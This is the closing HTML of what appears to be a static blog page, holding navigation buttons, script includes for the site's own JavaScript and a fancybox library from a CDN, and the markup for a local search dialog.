title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
